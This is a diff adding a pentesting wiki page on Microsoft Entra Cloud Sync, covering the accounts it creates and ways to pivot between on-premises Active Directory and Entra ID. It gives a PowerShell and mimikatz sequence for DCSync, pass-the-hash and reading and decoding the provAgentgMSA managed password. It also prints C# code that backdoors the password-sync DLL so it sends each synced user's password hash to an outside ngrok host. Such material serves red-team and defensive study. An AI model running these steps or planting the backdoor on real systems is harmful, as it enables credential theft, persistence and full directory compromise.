@@ -1,0 +1,137 @@
+# Az - Cloud Sync
+
+## Basic Information
+
+**Cloud Sync** is basically the new way of Azure to **synchronize the users from AD into Entra ID**.
+
+[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/cloud-sync/what-is-cloud-sync) Microsoft Entra Cloud Sync is a new offering from Microsoft designed to meet and accomplish your hybrid identity goals for synchronization of users, groups, and contacts to Microsoft Entra ID. It accomplishes this by using the Microsoft Entra cloud provisioning agent instead of the Microsoft Entra Connect application. However, it can be used alongside Microsoft Entra Connect Sync.
+
+### Principals Generated
+
+In order for this to work some principals are created in both Entra ID and the On-Premise directry:
+
+- In Entra ID the user `On-Premises Directory Synchronization Service Account` (`ADToAADSyncServiceAccount@carloshacktricks.onmicrosoft.com`) is created with the role **`Directory Synchronization Accounts`** (`d29b2b05-8046-44ba-8758-1e26182fcf32`). 
+
+> [!WARNING]
+> This role used to have a lot of privileged permissions and it could be used to [**escalate privileges even to global admin**](https://medium.com/tenable-techblog/stealthy-persistence-with-directory-synchronization-accounts-role-in-entra-id-63e56ce5871b). However, Microsoft decided to remove all the privileges of this role and assign it just a new one **`microsoft.directory/onPremisesSynchronization/standard/read`** which doesn't really allow to perform any privileged action (like modifying the password or atribbutes of a user or adding a new credential to a SP).
+
+- In Entra ID also the group **`AAD DC Administrators`** is created without members or owners. This group is useful if [`Microsoft Entra Domain Services`](./az-domain-services.md) is used.
+
+- In the AD, either the Service Account **`provAgentgMSA`** is created with a SamAcountName like **`pGMSA_<id>$@domain.com`** (`Get-ADServiceAccount -Filter * | Select Name,SamAccountName`), or a custom one with [**these permissions is needed**](https://learn.microsoft.com/en-us/entra/identity/hybrid/cloud-sync/how-to-prerequisites?tabs=public-cloud#custom-gmsa-account). Usually the default one is created.
+
+> [!WARNING]
+> Among other permissions the Service Account **`provAgentgMSA`** has DCSync permissions, allowing **anyone that compromises it to compromise the whole directory**. For more information about [DCSync check this](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html).
+
+> [!NOTE]
+> By default users of known privileged groups like Domain Admins with the attribute **`adminCount` to 1 are not synchronized** with Entra ID for security reasons. However, other users that are part of privileged groups without this attribute or that are assigned high privileges directly **can be synchronized**.
+
+## Password Sychronization
+
+The section is very similar to the one from:
+
+- **Password hash synchronization** can be enabled so users will be able to **login into Entra ID using their passwords from AD**. Moreover, whenever a password is modified in AD, it'll be updated in Entra ID.
+- **Password writeback** can also be enabled, allowing users to modify their password in Entra ID automatically synchronizing their password in the on-premise domain. But according to the [current docs](https://learn.microsoft.com/en-us/entra/identity/authentication/tutorial-enable-sspr-writeback#configure-password-writeback), for this is needed to use the Connect Agent, so take a look to the [Az Connect Sync section](./az-connect-sync.md) for more information.
+- **Groups writeback**: This feature allows group memberships from Entra ID to be synchronized back to the on-premises AD. This means that if a user is added to a group in Entra ID, they will also be added to the corresponding group in AD.
+
+## Pivoting
+
+### AD --> Entra ID
+
+- If the AD users are being synced from the AD to Entra ID, pivoting from AD to Entra ID is straightforward, just **compromise some user's password or change some user's password or create a new user and wait until it's synced into the Entra ID directory (usually only a few mins)**.
+
+So you could for example
+- Compromise the **`provAgentgMSA`** account, perform a DCSync attack, crack the password of some user and then use it to login into Entra ID.
+- Just create a new user in the AD, wait until it's synced into Entra ID and then use it to login into Entra ID.
+- Modify the password of some user in the AD, wait until it's synced into Entra ID and then use it to login into Entra ID.
+
+To compromise the **`provAgentgMSA`** credentials:
+
+```powershell
+# Enumerate provAgentgMSA account
+Get-ADServiceAccount -Filter * -Server domain.local
+# Find who can read the password of the gMSA (usually only the DC computer account)
+Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties * -Server domain.local | selectPrincipalsAllowedToRetrieveManagedPassword
+
+# You need to perform a PTH with the hash of the DC computer account next. For example using mimikatz:
+lsadump::dcsync /domain:domain.local /user:<dc-name>$
+sekurlsa::pth /user:<dc-name>$ /domain:domain.local /ntlm:<hash> /run:"cmd.exe"
+
+# Or you can change who can read the password of the gMSA account to all domain admins for example:
+Set-ADServiceAccount -Identity 'pGMSA_<id>$' -PrincipalsAllowedToRetrieveManagedPassword 'Domain Admins'
+
+# Read the password of the gMSA
+$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties msDS-ManagedPassword -server domain.local).'msDS-ManagedPassword'
+
+#Install-Module -Name DSInternals
+#Import-Module DSInternals
+$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
+ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+```
+
+Now you could use the hash of the gMSA to perform a Pass-the-Hash attack against Entra ID using the `provAgentgMSA` account and maintain persistence being able to perform DCSync attacks against the AD.
+
+For more information about how to compromise an Active Directory check:
+
+> [!NOTE]
+> Note that There isn't any way to give Azure or EntraID roles to synced users based on its attributes for example in the Cloud Sync configurations. However, in order to automatically grant permissions to synced users some **Entra ID groups from AD** might be given permissions so the synced users inside those groups also receive them or **dynamic groups might be used**, so always check for dynamic rules and potential ways to abuse them:
+
+Regarding persistence [this blog post](https://tierzerosecurity.co.nz/2024/05/21/ms-entra-connect-sync-mothods.html) suggest that it's possible to use [**dnSpy**](https://github.com/dnSpy/dnSpy) to backdoor the dll **`Microsoft.Online.Passwordsynchronisation.dll`** located in **`C:\Program Files\Microsoft Azure AD Sync\Bin`** that is used by the Cloud Sync agent to perform the password synchronization making it exfiltrate the password hashes of the users being synchronized to a remote server. The hashes are generated inside the class **`PasswordHashGenerator`** and the blog post suggest adding some code so the class looks like (note the `use System.Net` and the `WebClient` usage to exfiltrate the password hashes):
+
+```csharp
+using System;
+using System.Net;
+using Microsoft.Online.PasswordSynchronization.DirectoryReplicationServices;
+
+namespace Microsoft.Online.PasswordSynchronization
+{
+	// Token: 0x0200003E RID: 62
+	public class PasswordHashGenerator : ClearPasswordHashGenerator
+	{
+		// Token: 0x06000190 RID: 400 RVA: 0x00006DFC File Offset: 0x00004FFC
+		public override PasswordHashData CreatePasswordHash(ChangeObject changeObject)
+		{
+			PasswordHashData passwordHashData = base.CreatePasswordHash(changeObject);
+			try
+			{
+				using (WebClient webClient = new WebClient())
+				{
+					webClient.DownloadString("https://786a39c7cb68.ngrok-free.app?u=" + changeObject.DistinguishedName + "&p=" + passwordHashData.Hash);
+				}
+			}
+			catch (Exception)
+			{
+			}
+			return new PasswordHashData
+			{
+				Hash = OrgIdHashGenerator.Generate(passwordHashData.Hash),
+				RawHash = passwordHashData.RawHash
+			};
+		}
+	}
+}
+```
+
+### Entra ID --> AD
+
+- If **Password Writeback** is enabled, you could modify the password of some users from Entra ID and if you have access to the AD network, connect using them. For more info check the [Az Connect Sync section](./az-connect-sync.md) section for more information as the password writeback is configured using that agent.
+
+- At this point in time Cloud Sync also allows **"Microsoft Entra ID to AD"**, but after too much time I found that it CANNOT synchronize EntraID users to AD and that it can only synchronize users from EntraID that were synchronized with the password hash and come from a domain that belong to the same domain forest as the domain we are synchronizing to as you can read in [https://learn.microsoft.com/en-us/entra/identity/hybrid/group-writeback-cloud-sync#supported-groups-and-scale-limits](https://learn.microsoft.com/en-us/entra/identity/hybrid/group-writeback-cloud-sync#supported-groups-and-scale-limits):
+
+> - These groups can only contain on-premises synchronized users and / or additional cloud created security groups.
+> - The on-premises user accounts that are synchronized and are members of this cloud created security group, can be from the same domain or cross-domain, but they all must be from the same forest.
+
+So the attack surface (and usefulness) of this service is greatly reduced as an attacker would need to compromise the initial AD from where the users are being synchronized in order to compromise a user in the other domain (and both must be in the same forest apparently).
+
+### Enumeration
+
+```bash
+# Check for the gMSA SA
+Get-ADServiceAccount -Filter "ObjectClass -like 'msDS-GroupManagedServiceAccount'"
+
+# Get all the configured cloud sync agents (usually one per on-premise domain)
+## In the machine name of each you can infer the name of the domain
+az rest \
+  --method GET \
+  --uri "https://graph.microsoft.com/beta/onPremisesPublishingProfiles('provisioning')/agents/?\$expand=agentGroups" \
+  --headers "Content-Type=application/json"
+```
